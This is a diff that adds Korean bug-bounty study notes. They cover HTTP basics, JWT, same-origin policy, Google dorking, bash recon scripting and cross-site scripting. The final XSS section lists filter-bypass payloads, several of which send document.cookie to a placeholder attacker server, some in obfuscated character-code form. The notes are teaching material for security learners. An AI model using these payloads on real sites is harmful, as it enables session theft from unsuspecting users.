@@ -78,3 +78,280 @@ worst case 시나리오를 제시함으로써 심각성을 알린다.
 - Triaged: 채택된 경우. 이 때 보상을 받을 수 있다. 여기서 끝이 아니라 문제를 고치기 위해 보안팀에 마지막까지 협력한다.
 
 - Resolved: 해결책까지 반영되고 완전히 끝나는 상태.
+
+# 웹서버에 대하여
+
+웹서버는 보통 HTML, CSS, JavaScript로 이루어져있다.
+
+HTML은 텍스트파일, CSS는 페이지를 꾸미는 용도, JS는 *서버를 거치지않고* 클라이언트 쪽에서 동작을 수행하도록 한다.
+
+리퀘스트는 아래와 같은 형식으로 되어있다.
+
+```
+GET / HTTP/1.1            <-리퀘스트 라인 (method, url, version)
+Host: www.google.com      <-호스트네임
+User-Agent: Mozila /5.0   <-OS와 소프트웨어 버전
+Accept: text/html, application/xhtml+xml, application/xml
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate        <-Accept*는 response의 포맷을 지정한다.
+Connection: close         <-서버 응답 후 연결상태를 지정한다.
+```
+
+그 밖에도 아래의 정보들을 포함할 수 있다.
+- Cookie: 쿠키 정보
+- Referer: 현재 페이지 이전의 페이지 주소
+- Authorization: 유저 크레덴셜
+
+## Internet Security Control
+
+- Content encoding: 데이터가 깨지는 걸 막기 위해 인코딩을 한다.
+    - base64
+    - Hexademical encoding (HEX)
+    - URL encoding
+
+## Session management and HTTP Cookies
+
+한번 로그인 후 다시 로그인 할 필요없이 연결되는건 세션 덕분.
+
+로그인하면 세션 아이디가 생성되고 로그아웃되면 무효화 된다.
+
+긴 시간 반응이 없으면 서버에서 주기적으로 세션을 무효화 시킬 수 있다.
+
+쿠키는 세션 정보를 포함하고 있다.
+
+## JSON Web Token (JWT)
+
+- header: 알고리즘 정보를 포함. base64 인코딩 되어있다. `{"alg": "HS256", "typ": "JWT"}`
+- payload: 유저 정보를 가지고 있다. 이것도 역시 base64 인코딩
+- Signature: 헤더의 알고리즘과 비밀키를 이용하여 세션을 검증한다.
+
+최종적으로 암호화된 토큰은 아래와 같은 포맷이된다.
+
+`header.payload.signature`
+
+## The Same Origin Policy
+
+리퀘스트의 오리진이 같은 경우에만 데이터에 접근이 가능하다. 즉, 프로토콜, 호스트네임, 포트번호가 같아야한다.
+
+예를들어 https://medium.com/@hong이 있다고 하자.
+
+위에 접속이 가능한 오리진은
+
+https://medium.com O
+
+http://medium.com 프로토콜이 다르기 때문에 X
+
+https://twitter.com/@hong 호스트네임이 다르기 때문에 X
+
+https://medium.com:8080/@hong 포트번호가 다르기 때문에 X
+
+이와 같이 SOP기능 덕분에 악성 사이트에서 내 세션을 빼앗은 후 데이터에 접속하려고 하는걸 막을 수 있다.
+
+# OSINT
+
+## Google dorking
+
+구글 검색을 이용하여 정찰하는 방법.
+
+- site: print site:python.org
+- inurl: inurl: "/course/jumpto.php" site:example.com
+- intitle: 페이지 타이틀에 있는 특정 문자열을 검색.
+
+intitle: "index of" site: example.com
+- filetype: filetype:log site:example.com
+- Quotes(""): exact match
+- or ( | ): 앞뒤를 스페이스로 공백을 두어야함. site: {reddit.com | google.com}
+- minus (-): 제외하고 싶은 검색어를 입력
+
+"how to hack websites" -php
+
+그 밖에 많은 예제들을 https://www.exploit-db.com/google-hacking-database에서 확인할 수 있다.
+
+# bash shell script
+
+if문
+
+```sh
+if [ condition 1 ]
+then
+  # Do if condition 1 is satisfied
+elif [ condition 2 ]
+then
+  # Do if condition 2 is satisfied, and condition 1 is not satisfied
+else
+  # Do something else if neither condition is satisfied
+fi
+```
+
+case문
+
+```sh
+case $VARIABLE_NAME in
+  case1)
+    Do something
+    ;;
+  case2)
+    Do something
+    ;; 
+  caseN)
+    Do something
+    ;;
+  *)       
+    Default case, this case is executed if no other case matches.
+    ;; 
+esac
+```
+
+함수 선언
+```sh
+FUNCTION_NAME()
+{
+  DO_SOMETHING
+}
+```
+
+**bash 변수는 글로벌이지만 인풋으로 받은 파라미터는 글로벌이 아닌것에 주의**
+
+예를들어 아래의 경우 $1은 namp_sacn()의 인풋으로 인식하기 때문에 아무값도 들어있지 않음.
+
+```
+nmap_scan()
+{
+  nmap $1 > $DIRECTORY/nmap 
+  echo "The results of nmap scan are stored in $DIRECTORY/nmap."
+}
+nmap_scan
+```
+
+옵션 받는 법
+
+```sh
+getopts "m:" OPTION
+MODE=$OPTARG
+
+./recon.sh -m nmap-only facebook.com fbcdn.net
+```
+
+for loop
+
+```sh
+for i in "${@:$OPTIND:$#}"
+do
+  # Do the scans for $i
+done
+
+# "${INPUT_ARRAY:START_INDEX:END_INDEX}"
+```
+
+# Cross-Site Scripting (XSS)
+
+가장 많이 발견되는 버그.
+
+피해자의 브라우저에서 스크립트를 실행하는 공격. 주로 자바스크립트가 사용된다.
+
+HTML 페이지에 실행가능한 스크립트를 인젝션한다.
+
+`<script></script>`로 실행가능한 코드를 인식한다. 직접 써넣는 것을 inline script라고 부른다.
+
+`<src>`를 사용하면 외부파일을 불러올 수 있다.
+
+공격자가 다른 사람 페이지의 소스코드를 바꿀 수 있는 방법은 없기 때문에 악성코드가 있는 페이지에 유도하는 경우가 많다.
+
+이때 들어오는 리퀘스트를 보고 쿠키 같은 정보를 얻을 수 있다.
+
+## Stored XSS
+
+- 유저의 input이 서버에 저장되는 경우. XSS 타입중에 가장 심각하다. 서버에 저장되기 때문에 악성코드를 저장한 서버의 페이지를 보는
+유저 모두 피해 대상이 되기 때문에 영향력이 크다.
+
+- 예를들어 댓글창에 다음 페이로드를 인젝션한다. `<script>alert('vulnerable');</script>` 
+그럼 댓글창을 보는 유저 전부 페이로드 내용처럼 vulnerable이라는 메세지가 팝업된다.
+
+## Reflected XSS
+
+- 페이로드가 서버의 데이터베이스에 저장되지는 않지만 바로 결과를 확인할 수 있다.
+
+`https://example.com/search?q=<script>alert('XSS by Vickie');</script>`
+
+- 링크를 클릭하도록 유도하여 페이로드를 실행 시킨다.
+
+## DOM-based XSS
+
+- 웹서버를 거치지 않고 로컬 복사된 스크립트를 수정한다. 특히 JQuery를 사용하면 이 공격에 취약하다.
+(JQuery는 다이나믹하게 DOM 요소들을 바꾸기 때문에). 
+
+- 악성 링크를 클릭하는 유저만 피해를 입는다.
+
+- 페이로드 https://portswigger.net/web-security/cross-site-scripting/dom-based
+
+## XSS 공략
+
+1. 입력 가능한 부분들을 살펴본다.
+
+form, sign up, comment, blog post 등등 입력가능한 곳 모두 살펴본다.
+특히 드롭다운 메뉴라고 불가능하지 않다. burp로 리퀘스트를 잡고 페이로드를 입력해본다.
+
+```
+POST /edit_user_age
+ 
+(Post request body)
+age=20
+```
+
+위의 age 부분에 아래와 같이 넣어본다.
+
+```
+POST /edit_user_age
+ 
+(Post request body)
+age=<script>alert('XSS by Hong');</script>
+```
+
+만약 팝업창이 뜨면 페이지 소스 보기에서 어느부분인지 Ctrl+F로 찾아본다.
+
+*최근 웹 프레임워크들은 기본적으로 XSS에 대한 대비가 되어있어서 거의 성공하기 어렵다.
+하지만 IoT 같이 옛날 프레임워크를 쓰는 경우에는 잘 발견된다.*
+
+2. 페이로드를 작성
+
+취약한 부분을 발견하면 페이로드를 작성한다. <scipt>가 항상 성공하지도 않고 의외에도 많은 
+스크립트가 있기 때문에 아래의 페이지를 확인.
+
+- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+- https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/
+
+![XSS Payloads](/assets/img/textbook/bugbounty/XSSpayloads.png)
+
+## Bypassing XSS 
+
+<script>가 감지되는걸 우회하는 방법
+
+`<img src="/><script>alert('XSS by Vickie');</script>"/>`
+
+`<img src="123" onerror="alert('XSS by Vickie');"/>`
+
+`<a href="javascript:alert('XSS by Vickie')>Click me!</a>"`
+
+`<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>`
+
+자바스크립트 함수를 이용하여 ASKII 번호를 ASKII로 바꿈. http://attacker_server_ip/?c= 와 같다.
+
+`<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 
+47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>`
+
+문자열을 ASKII번호로 바꾸려면 아래의 함수를 사용하면 된다.
+```javascript
+<script>
+function ascii(c){
+  return c.charCodeAt();
+}
+encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
+document.write(encoded);
+</script>
+```
+
+`<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>`
+
